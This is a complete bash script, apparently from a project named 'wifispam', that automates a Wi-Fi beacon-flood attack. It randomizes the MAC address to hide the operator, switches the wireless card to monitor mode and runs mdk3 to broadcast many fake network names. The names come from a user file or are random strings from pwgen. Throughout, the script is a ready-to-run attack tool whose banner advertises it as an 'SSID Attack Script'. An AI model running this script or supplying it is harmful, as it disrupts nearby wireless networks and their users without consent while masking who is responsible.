#!/bin/bash

LOGFILE="wifi_test.log"

# Function to log messages
log_message() {
    local message="$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') : $message" | tee -a "$LOGFILE"
}

title() { 
    echo " __          _______ ______ _____  _____                       "
    echo " \ \        / /_   _|  ____|_   _|/ ____|                      "
    echo "  \ \  /\  / /  | | | |__    | | | (___  _ __   __ _ _ __ ___  "
    echo "   \ \/  \/ /   | | |  __|   | |  \___ \| '_ \ / _  |  _   _ \ "
    echo "    \  /\  /   _| |_| |     _| |_ ____) | |_) | (_| | | | | | |"
    echo "     \/  \/   |_____|_|    |_____|_____/| .__/ \__,_|_| |_| |_|"
    echo "                                        | |                    "
    echo "                                        |_|                    "
}

# Function to handle errors
error_handler() {
    log_message "Error: $1"
    echo "Error: $1"
    exit 1
}

# Function to check necessary tools
check_dependencies() {
    local tools=("mdk3" "macchanger" "pwgen" "iwconfig" "nmcli")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            error_handler "Required tool '$tool' is not installed. Please install it and try again."
        fi
    done
    log_message "All necessary tools are installed."
}

# Function to validate the wireless interface
validate_interface() {
    local iface="$1"
    
    if ! iwconfig "$iface" &> /dev/null; then
        error_handler "Interface $iface is either not wireless or unsupported."
    fi

    if ! ifconfig "$iface" &> /dev/null; then
        error_handler "Interface $iface not found. Please check its availability."
    fi
    
    log_message "Interface $iface successfully passed validation."
}

# Function to verify MAC address change
check_mac_change() {
    local iface="$1"
    local original_mac
    original_mac=$(ifconfig "$iface" | grep ether | awk '{print $2}')
    
    log_message "Current MAC address before change: $original_mac"
    
    macchanger -r "$iface" > /dev/null 2>&1 || error_handler "Failed to change MAC address on $iface"
    
    local new_mac
    new_mac=$(ifconfig "$iface" | grep ether | awk '{print $2}')
    
    if [ "$original_mac" == "$new_mac" ]; then
        error_handler "MAC address did not change. Check your settings and try again."
    else
        log_message "MAC address successfully changed to $new_mac."
    fi
}

# Clean up the system
cleanup() {
    log_message "Starting system cleanup..."

    ifconfig "$INTERFACE" down > /dev/null 2>&1 || log_message "Failed to bring down interface $INTERFACE"
    iwconfig "$INTERFACE" mode managed > /dev/null 2>&1 || log_message "Failed to set $INTERFACE to managed mode"
    ifconfig "$INTERFACE" up > /dev/null 2>&1 || log_message "Failed to bring up interface $INTERFACE"
    
    macchanger -p "$INTERFACE" > /dev/null 2>&1 || log_message "Failed to restore MAC address on $INTERFACE"

    if ifconfig "$INTERFACE" | grep -q "UP"; then
        log_message "$INTERFACE successfully brought up."
    else
        log_message "Error: Failed to bring up $INTERFACE after restoring."
        exit 1
    fi

    if nmcli device show "$INTERFACE" > /dev/null 2>&1; then
        nmcli device connect "$INTERFACE" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            log_message "$INTERFACE successfully connected via nmcli."
        else
            log_message "Error: Failed to connect $INTERFACE via nmcli."
        fi
    else
        log_message "Error: nmcli cannot detect the state of $INTERFACE."
    fi

    rm -f RANDOM_wordlist.txt > /dev/null 2>&1
    log_message "Cleanup complete."
}

# Setup the interface
setup_interface() {
    log_message "Setting up $INTERFACE..."
    ifconfig "$INTERFACE" down || error_handler "Failed to bring down $INTERFACE"
    check_mac_change "$INTERFACE"
    iwconfig "$INTERFACE" mode monitor || error_handler "Failed to set $INTERFACE to monitor mode"
    ifconfig "$INTERFACE" up || error_handler "Failed to bring up $INTERFACE"
    log_message "$INTERFACE is now in monitor mode."
}

# Interface selection
select_interface() {
    echo "Select a wireless interface from the list:"
    ifconfig | grep -e ": " | sed -e 's/: .*//g' | sed -e 's/^/   /'
    echo -n "Enter the name of the wireless interface: "
    read -r INTERFACE

    if [[ -z "$INTERFACE" ]]; then
        error_handler "No interface selected."
    fi

    validate_interface "$INTERFACE"
    log_message "Selected interface: $INTERFACE"
}

# Run the attack
run_attack() {
    local wordlist="$1"
    local ssid_count="$2"
    log_message "Starting attack using $ssid_count SSIDs from $wordlist"
    setup_interface
    trap cleanup EXIT
    mdk3 "$INTERFACE" b -f "$wordlist" -a -s "$ssid_count" || error_handler "Failed to execute attack using mdk3."
    log_message "Attack finished."
}

# Generate random SSIDs
generate_random_ssids() {
    local count="$1"
    log_message "Generating $count random SSIDs..."
    > RANDOM_wordlist.txt
    for ((i = 1; i <= count; i++)); do
        echo "$(pwgen 14 1)" >> RANDOM_wordlist.txt
    done
    log_message "Random SSIDs generated and saved in RANDOM_wordlist.txt"
}

# Main function
main() {
    echo "===================================================================="
    title
    echo "===================================================================="
    echo "   Wi-Fi SSID Attack Script be kewwL"
    echo "   Project Repository: https://github.com/cbFelix/wifispam"
    echo "===================================================================="
    log_message "Script started."

    check_dependencies
    select_interface
    
    echo "Select an option:"
    echo "1. Use SSID file"
    echo "2. Generate random SSIDs"
    echo -n "> "
    read -r OPTION

    case $OPTION in
        1)
            echo -n "Enter the path to the SSID file: "
            read -r wordlist
            if [[ ! -f "$wordlist" ]]; then
                error_handler "File $wordlist not found."
            fi
            ssid_count=$(wc -l < "$wordlist")
            log_message "$wordlist loaded with $ssid_count SSIDs."
            run_attack "$wordlist" "$ssid_count"
            ;;
        2)
            echo -n "How many random SSIDs to generate? "
            read -r ssid_count
            if ! [[ "$ssid_count" =~ ^[0-9]+$ ]]; then
                error_handler "Invalid SSID count."
            fi
            generate_random_ssids "$ssid_count"
            run_attack "RANDOM_wordlist.txt" "$ssid_count"
            ;;
        *)
            error_handler "Invalid option selected."
            ;;
    esac
}

main
